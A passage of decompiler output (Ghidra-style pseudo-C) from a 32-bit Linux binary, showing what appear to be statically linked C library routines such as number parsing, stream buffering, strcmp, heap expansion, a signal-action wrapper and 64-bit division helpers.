            iVar1 = param_2 * uVar11 + (int)((ulonglong)param_2 * (ulonglong)uVar7 >> 0x20);
            if ((iVar1 == -1) && (~uVar8 < uVar6)) goto LAB_080537e4;
            pbVar3 = *(byte **)(param_1 + 4);
            if (pbVar3 < *(byte **)(param_1 + 0x68)) {
              local_58 = (uint)*pbVar3;
              *(byte **)(param_1 + 4) = pbVar3 + 1;
            }
            else {
              local_58 = FUN_08053c20(param_1);
            }
            uVar7 = uVar8 + uVar6;
            uVar11 = iVar1 + (uint)CARRY4(uVar8,uVar6);
            local_15 = (&DAT_08054d41)[local_58];
          }
        }
        goto LAB_08053859;
      }
    }
    if (*(int *)(param_1 + 0x68) != 0) {
      *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + -1;
    }
    FUN_08053ba0(param_1,0,0);
  }
  puVar4 = (undefined4 *)FUN_08050d40();
  local_3c = 0;
  local_38 = 0;
  *puVar4 = 0x16;
  goto LAB_08053505;
LAB_080537e4:
  while (local_15 < param_2) {
    pbVar3 = *(byte **)(param_1 + 4);
    if (pbVar3 < *(byte **)(param_1 + 0x68)) {
      uVar8 = (uint)*pbVar3;
      *(byte **)(param_1 + 4) = pbVar3 + 1;
    }
    else {
      uVar8 = FUN_08053c20(param_1);
    }
    local_15 = (&DAT_08054d41)[uVar8];
  }
  puVar4 = (undefined4 *)FUN_08050d40();
  *puVar4 = 0x22;
  uVar7 = param_4;
  uVar11 = param_5;
  if ((param_4 & 1) != 0) {
    local_20 = 0;
  }
LAB_08053859:
  if (*(int *)(param_1 + 0x68) != 0) {
    *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + -1;
  }
  if ((uVar11 < param_5) || ((uVar11 <= param_5 && (uVar7 < param_4)))) {
LAB_080538ab:
    return CONCAT44((((int)local_20 >> 0x1f ^ uVar11) - ((int)local_20 >> 0x1f)) -
                    (uint)((local_20 ^ uVar7) < local_20),(local_20 ^ uVar7) - local_20);
  }
  if ((param_4 & 1 | local_20) == 0) {
    puVar4 = (undefined4 *)FUN_08050d40();
    local_3c = param_4 - 1;
    local_38 = (param_5 - 1) + (uint)(param_4 != 0);
    *puVar4 = 0x22;
  }
  else {
    if ((uVar11 < param_5) || ((uVar11 <= param_5 && (uVar7 <= param_4)))) goto LAB_080538ab;
    puVar4 = (undefined4 *)FUN_08050d40();
    *puVar4 = 0x22;
  }
LAB_08053505:
  return CONCAT44(local_38,local_3c);
}



void FUN_08053ba0(int param_1,uint param_2,uint param_3)

{
  uint uVar1;
  int iVar2;
  
  *(uint *)(param_1 + 0x70) = param_3;
  *(uint *)(param_1 + 0x6c) = param_2;
  uVar1 = *(int *)(param_1 + 8) - *(int *)(param_1 + 4);
  *(uint *)(param_1 + 0x74) = uVar1;
  iVar2 = (int)uVar1 >> 0x1f;
  *(int *)(param_1 + 0x78) = iVar2;
  if ((((param_3 | param_2) == 0) || (iVar2 < (int)param_3)) ||
     ((iVar2 <= (int)param_3 && (uVar1 <= param_2)))) {
    *(int *)(param_1 + 0x68) = *(int *)(param_1 + 8);
  }
  else {
    *(uint *)(param_1 + 0x68) = *(int *)(param_1 + 4) + param_2;
  }
  return;
}



uint FUN_08053c20(int param_1)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  byte *pbVar7;
  int iVar8;
  int iVar9;
  byte local_20;
  
  uVar3 = *(uint *)(param_1 + 0x70);
  if ((((uVar3 | *(uint *)(param_1 + 0x6c)) != 0) &&
      (((int)uVar3 < *(int *)(param_1 + 0x78) ||
       (((int)uVar3 <= *(int *)(param_1 + 0x78) &&
        (*(uint *)(param_1 + 0x6c) <= *(uint *)(param_1 + 0x74))))))) ||
     (uVar3 = FUN_08054264(param_1), (int)uVar3 < 0)) {
    *(undefined4 *)(param_1 + 0x68) = 0;
    return 0xffffffff;
  }
  uVar2 = *(uint *)(param_1 + 0x6c);
  if ((*(uint *)(param_1 + 0x70) | uVar2) == 0) {
    iVar9 = *(int *)(param_1 + 8);
  }
  else {
    uVar4 = *(uint *)(param_1 + 0x74);
    iVar9 = *(int *)(param_1 + 8);
    uVar5 = iVar9 - *(int *)(param_1 + 4);
    iVar8 = (int)uVar5 >> 0x1f;
    iVar6 = ((*(uint *)(param_1 + 0x70) - *(int *)(param_1 + 0x78)) - (uint)(uVar2 < uVar4)) + -1 +
            (uint)(uVar2 - uVar4 != 0);
    if ((iVar6 <= iVar8) && ((iVar6 < iVar8 || ((uVar2 - uVar4) - 1 < uVar5)))) {
      *(uint *)(param_1 + 0x68) = *(int *)(param_1 + 4) + -1 + (uVar2 - uVar4);
      goto LAB_08053c9f;
    }
  }
  *(int *)(param_1 + 0x68) = iVar9;
LAB_08053c9f:
  if (iVar9 != 0) {
    uVar4 = (iVar9 + 1) - *(int *)(param_1 + 4);
    puVar1 = (uint *)(param_1 + 0x74);
    uVar2 = *puVar1;
    *puVar1 = *puVar1 + uVar4;
    *(int *)(param_1 + 0x78) =
         *(int *)(param_1 + 0x78) + ((int)uVar4 >> 0x1f) + (uint)CARRY4(uVar2,uVar4);
  }
  pbVar7 = (byte *)(*(int *)(param_1 + 4) + -1);
  if (uVar3 == *pbVar7) {
    return uVar3;
  }
  local_20 = (byte)uVar3;
  *pbVar7 = local_20;
  return uVar3;
}



int FUN_08053d40(undefined4 param_1,undefined4 param_2)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int *piVar6;
  int *piVar7;
  int *piVar8;
  uint *puVar9;
  int *piVar10;
  uint uVar11;
  int *piVar12;
  int local_20;
  int *local_1c;
  int *local_18;
  int *local_14;
  
  iVar5 = 0;
  iVar3 = *DAT_08055890;
  if (iVar3 == 0x21) {
LAB_08053d74:
    iVar3 = *(int *)(iVar5 + 4 + (int)DAT_08055890);
    if (*(ushort *)(iVar3 + 0x2c) != 0) {
      piVar6 = (int *)(*(int *)(iVar3 + 0x1c) + iVar3);
      iVar5 = 0;
      puVar9 = (uint *)0x0;
      local_20 = -1;
      while( true ) {
        if (*piVar6 == 1) {
          local_20 = (piVar6[1] - piVar6[2]) + iVar3;
        }
        else if (*piVar6 == 2) {
          puVar9 = (uint *)(iVar3 + piVar6[1]);
        }
        if (iVar5 + 1U == (uint)*(ushort *)(iVar3 + 0x2c)) break;
        iVar5 = iVar5 + 1;
        piVar6 = (int *)((int)piVar6 + (uint)*(ushort *)(iVar3 + 0x2a));
      }
      if (((puVar9 != (uint *)0x0) && (local_20 != -1)) && (uVar2 = *puVar9, uVar2 != 0)) {
        local_1c = (int *)0x0;
        local_18 = (int *)0x0;
        local_14 = (int *)0x0;
        iVar3 = 8;
        iVar5 = 0;
        piVar6 = (int *)0x0;
        piVar12 = (int *)0x0;
        do {
          iVar4 = iVar3;
          piVar7 = (int *)(*(int *)((int)puVar9 + iVar5 + 4) + local_20);
          piVar10 = piVar6;
          piVar8 = piVar7;
          piVar1 = local_18;
          if (uVar2 != 6) {
            piVar8 = piVar12;
            if (uVar2 < 7) {
              piVar10 = piVar7;
              if ((uVar2 != 4) && (piVar10 = piVar6, uVar2 == 5)) {
                local_1c = piVar7;
              }
            }
            else {
              piVar1 = piVar7;
              if ((uVar2 != 0x6ffffff0) && (piVar1 = local_18, uVar2 == 0x6ffffffc)) {
                local_14 = piVar7;
              }
            }
          }
          local_18 = piVar1;
          uVar2 = *(uint *)(iVar4 + (int)puVar9);
          iVar3 = iVar4 + 8;
          iVar5 = iVar4;
          piVar6 = piVar10;
          piVar12 = piVar8;
        } while (uVar2 != 0);
        if (((local_1c != (int *)0x0) && (piVar8 != (int *)0x0)) && (piVar10 != (int *)0x0)) {
          uVar2 = (uint)local_18 & ~-(uint)(local_14 == (int *)0x0);
          if (piVar10[1] != 0) {
            uVar11 = 0;
            do {
              if ((((0x27 >> (*(byte *)(piVar8 + 3) & 0xf) & 1U) != 0) &&
                  ((0x406 >> (*(byte *)(piVar8 + 3) >> 4) & 1U) != 0)) &&
                 ((*(short *)((int)piVar8 + 0xe) != 0 &&
                  (iVar3 = FUN_080542a0(param_2,(int)local_1c + *piVar8), iVar3 == 0)))) {
                if (uVar2 == 0) {
LAB_08053f41:
                  return local_20 + piVar8[1];
                }
                for (piVar6 = local_14;
                    ((*(byte *)((int)piVar6 + 2) & 1) != 0 ||
                    ((*(ushort *)(piVar6 + 1) & 0x7fff) !=
                     (*(ushort *)(uVar2 + uVar11 * 2) & 0x7fff)));
                    piVar6 = (int *)((int)piVar6 + piVar6[4])) {
                  if (piVar6[4] == 0) goto LAB_08053e97;
                }
                iVar3 = FUN_080542a0(param_1,*(int *)(piVar6[3] + (int)piVar6) + (int)local_1c);
                if (iVar3 == 0) goto LAB_08053f41;
              }
LAB_08053e97:
              uVar11 = uVar11 + 1;
              piVar8 = piVar8 + 4;
            } while (uVar11 < (uint)piVar10[1]);
          }
        }
      }
    }
  }
  else {
    iVar5 = 8;
    while (iVar3 != 0) {
      iVar3 = *(int *)(iVar5 + (int)DAT_08055890);
      if (iVar3 == 0x21) goto LAB_08053d74;
      iVar5 = iVar5 + 8;
    }
  }
  return 0;
}



int FUN_08053f50(uint *param_1)

{
  uint uVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uVar4;
  undefined4 ***local_14;
  
  uVar4 = *param_1;
  if (uVar4 < 0x7ffff000) {
    uVar4 = (-uVar4 & 0xfff) + uVar4;
    if (DAT_08055674 == (undefined4 ***)0x0) {
      iVar2 = FUN_08050f70();
      DAT_08055674 = (undefined4 ***)((-iVar2 & 0xfffU) + iVar2);
    }
    if (uVar4 < ~(uint)DAT_08055674) {
      local_14 = DAT_08055890;
      if ((((uVar4 + (int)DAT_08055674 <=
             ((uint)(DAT_08055890 + -0x200000) & ~-(uint)(DAT_08055890 < (undefined4 ***)0x800001)))
           || (DAT_08055890 <= DAT_08055674)) &&
          ((local_14 = &local_14,
           uVar4 + (int)DAT_08055674 <=
           ((uint)&stack0xff7fffec & ~-(uint)(local_14 < (undefined4 ***)0x800001)) ||
           (local_14 <= DAT_08055674)))) &&
         (iVar2 = FUN_08050f70(), iVar2 == uVar4 + (int)DAT_08055674)) {
        *param_1 = uVar4;
        DAT_08055674 = (undefined4 ***)iVar2;
        return iVar2 - uVar4;
      }
    }
    uVar1 = 0x1000 << ((byte)(DAT_08055670 >> 1) & 0x1f);
    if (uVar4 < uVar1) {
      uVar4 = uVar1;
    }
    iVar2 = FUN_08052259();
    if (iVar2 == -1) {
      iVar2 = 0;
    }
    else {
      *param_1 = uVar4;
      DAT_08055670 = DAT_08055670 + 1;
    }
  }
  else {
    puVar3 = (undefined4 *)FUN_08050d40();
    *puVar3 = 0xc;
    iVar2 = 0;
  }
  return iVar2;
}



undefined4 __regparm2
FUN_080540ef(undefined4 param_1_00,undefined4 param_2_00,uint param_1,uint *param_2,
            undefined4 *param_3)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 extraout_EDX;
  undefined4 local_40;
  undefined4 local_3c;
  undefined local_34 [8];
  uint local_2c;
  uint local_28;
  undefined *local_24;
  undefined local_20 [8];
  undefined4 local_18;
  undefined4 local_14;
  
  if (param_1 < 0x41) {
    if (param_2 != (uint *)0x0) {
      if (1 < *param_2) {
        param_2_00 = 1;
        LOCK();
        *(uint *)(&DAT_0805567c + (param_1 - 1 >> 5) * 4) =
             *(uint *)(&DAT_0805567c + (param_1 - 1 >> 5) * 4) | 1 << ((byte)(param_1 - 1) & 0x1f);
        UNLOCK();
        if ((DAT_08055884 == 0) && (DAT_08055678 == 0)) {
          local_18 = 0;
          local_14 = 3;
          FUN_08050f70();
          DAT_08055678 = 1;
          param_2_00 = extraout_EDX;
        }
      }
      local_2c = *param_2;
      local_28 = param_2[0x21] | 0x4000000;
      local_24 = &LAB_08054358;
      if ((*(byte *)(param_2 + 0x21) & 4) == 0) {
        local_24 = &DAT_08054350;
      }
      FUN_08052d4c(local_20,param_2 + 1,8,param_2_00);
    }
    uVar3 = FUN_08050f70();
    iVar2 = FUN_08050fe0(uVar3);
    uVar3 = 0xffffffff;
    if ((iVar2 == 0) && (uVar3 = 0, param_3 != (undefined4 *)0x0)) {
      *param_3 = local_40;
      param_3[0x21] = local_3c;
      FUN_08052d4c(param_3 + 1,local_34,8,local_3c);
      uVar3 = 0;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_08050d40();
    uVar3 = 0xffffffff;
    *puVar1 = 0x16;
  }
  return uVar3;
}



undefined4 FUN_0805423a(int param_1)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  
  if (2 < param_1 - 0x20U) {
    uVar1 = FUN_080540ef();
    return uVar1;
  }
  puVar2 = (undefined4 *)FUN_08050d40();
  *puVar2 = 0x16;
  return 0xffffffff;
}



uint FUN_08054264(int param_1)

{
  int iVar1;
  byte local_5;
  
  iVar1 = FUN_08054360(param_1);
  if ((iVar1 == 0) && (iVar1 = (**(code **)(param_1 + 0x20))(param_1,&local_5,1,0), iVar1 == 1)) {
    return (uint)local_5;
  }
  return 0xffffffff;
}



int FUN_080542a0(byte *param_1,byte *param_2)

{
  byte bVar1;
  
  bVar1 = *param_1;
  if (bVar1 == *param_2) {
    do {
      if (bVar1 == 0) break;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      bVar1 = *param_1;
    } while (bVar1 == *param_2);
  }
  return (uint)*param_1 - (uint)*param_2;
}



int FUN_080542cc(undefined4 param_1)

{
  code *pcVar1;
  int iVar2;
  undefined4 *extraout_ECX;
  
  pcVar1 = (code *)swi(0x80);
  iVar2 = (*pcVar1)(param_1,0xfffff,0x51);
  if (iVar2 == 0) {
    *extraout_ECX = param_1;
    iVar2 = 0;
  }
  else {
    pcVar1 = (code *)swi(0x80);
    iVar2 = (*pcVar1)();
    if (iVar2 == 0) {
      iVar2 = 1;
    }
  }
  return iVar2;
}



void FUN_08054324(undefined4 param_1,undefined4 param_2)

{
  thunk_FUN_08050fbb(0xa2,param_1,param_2,0,0,0,0);
  FUN_08050fe0();
  return;
}



undefined8 FUN_08054360(uint *param_1)

{
  uint uVar1;
  undefined4 uStack_c;
  
  *(byte *)((int)param_1 + 0x4a) =
       *(byte *)((int)param_1 + 0x4a) - 1 | *(byte *)((int)param_1 + 0x4a);
  if (param_1[0xb] < param_1[5]) {
    (*(code *)param_1[9])(param_1,0,0,param_1[5]);
  }
  param_1[4] = 0;
  param_1[7] = 0;
  param_1[5] = 0;
  if ((*param_1 & 4) == 0) {
    param_1[2] = param_1[0xc] + param_1[0xb];
    param_1[1] = param_1[0xc] + param_1[0xb];
    uVar1 = ~-(uint)((*param_1 & 0x10) == 0);
  }
  else {
    *param_1 = *param_1 | 0x20;
    uVar1 = 0xffffffff;
  }
  return CONCAT44(uStack_c,uVar1);
}



undefined8 __regparm3 FUN_080543d0(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined8 uStack_c;
  
  if (param_1 != 0) {
    if (-1 < *(int *)(param_1 + 0x4c)) {
      FUN_080544bd(param_1);
      param_3 = extraout_ECX;
    }
    if (*(uint *)(param_1 + 0x1c) < *(uint *)(param_1 + 0x14)) {
      (**(code **)(param_1 + 0x24))(param_1,0,0,param_3);
    }
    if (*(uint *)(param_1 + 4) < *(uint *)(param_1 + 8)) {
      iVar1 = *(uint *)(param_1 + 4) - *(uint *)(param_1 + 8);
      (**(code **)(param_1 + 0x28))(param_1,iVar1,iVar1 >> 0x1f,1);
    }
  }
  return uStack_c;
}



void FUN_0805441d(void)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)FUN_0805445d();
  for (iVar2 = *piVar1; iVar2 != 0; iVar2 = *(int *)(iVar2 + 0x38)) {
    FUN_080543d0();
  }
  FUN_080543d0();
  FUN_080543d0();
  return;
}



undefined * FUN_0805445d(void)

{
  FUN_08052ebf(&DAT_0805568c);
  return &DAT_08055688;
}



undefined4 FUN_080544bd(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  int *in_GS_OFFSET;
  
  iVar1 = *(int *)(*in_GS_OFFSET + 0x1c);
  uVar3 = 0;
  if (*(int *)(param_1 + 0x4c) != iVar1) {
    while( true ) {
      LOCK();
      iVar2 = *(int *)(param_1 + 0x4c);
      if (iVar2 == 0) {
        *(int *)(param_1 + 0x4c) = iVar1;
        iVar2 = 0;
      }
      UNLOCK();
      if (iVar2 == 0) break;
      FUN_08052f00(param_1 + 0x4c,param_1 + 0x50,iVar2,1);
    }
    uVar3 = 1;
  }
  return uVar3;
}



undefined8 FUN_08054510(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  longlong lVar4;
  byte bVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  byte bStack_14;
  
  if (param_4 == 0) {
    if (param_2 < param_3) {
      iVar6 = (int)(CONCAT44(param_2,param_1) / (ulonglong)param_3);
      uVar7 = 0;
    }
    else {
      if (param_3 == 0) {
        param_3 = (uint)(1 / 0);
      }
      uVar7 = param_2 / param_3;
      iVar6 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                   (ulonglong)param_3);
    }
    goto LAB_08054550;
  }
  if (param_4 <= param_2) {
    uVar7 = 0x1f;
    if (param_4 != 0) {
      for (; param_4 >> uVar7 == 0; uVar7 = uVar7 - 1) {
      }
    }
    if ((uVar7 ^ 0x1f) != 0) {
      bVar5 = (byte)(uVar7 ^ 0x1f);
      bStack_14 = 0x20 - bVar5;
      uVar1 = (ulonglong)(param_3 >> (bStack_14 & 0x1f) | param_4 << (bVar5 & 0x1f));
      uVar2 = CONCAT44(param_2 >> (bStack_14 & 0x1f),
                       param_1 >> (bStack_14 & 0x1f) | param_2 << (bVar5 & 0x1f));
      uVar3 = uVar2 / uVar1;
      iVar6 = (int)uVar3;
      uVar7 = (uint)(uVar2 % uVar1);
      lVar4 = (uVar3 & 0xffffffff) * (ulonglong)(param_3 << (bVar5 & 0x1f));
      uVar8 = (uint)((ulonglong)lVar4 >> 0x20);
      if ((uVar7 < uVar8) || ((uVar8 == uVar7 && (param_1 << (bVar5 & 0x1f) < (uint)lVar4)))) {
        uVar7 = 0;
        iVar6 = iVar6 + -1;
      }
      else {
        uVar7 = 0;
      }
      goto LAB_08054550;
    }
    if ((param_4 < param_2) || (param_3 <= param_1)) {
      iVar6 = 1;
      uVar7 = 0;
      goto LAB_08054550;
    }
  }
  iVar6 = 0;
  uVar7 = 0;
LAB_08054550:
  return CONCAT44(uVar7,iVar6);
}



undefined4 FUN_08054660(void)

{
  code *pcVar1;
  int iVar2;
  undefined4 uStack_c;
  
  if (DAT_08055048 != (code *)0xffffffff) {
    iVar2 = 0;
    pcVar1 = DAT_08055048;
    do {
      (*pcVar1)();
      pcVar1 = *(code **)(&DAT_08055044 + iVar2);
      iVar2 = iVar2 + -4;
    } while (pcVar1 != (code *)0xffffffff);
  }
  return uStack_c;
}



void FUN_08054687(void)

{
  FUN_080480b0();
  return;
}


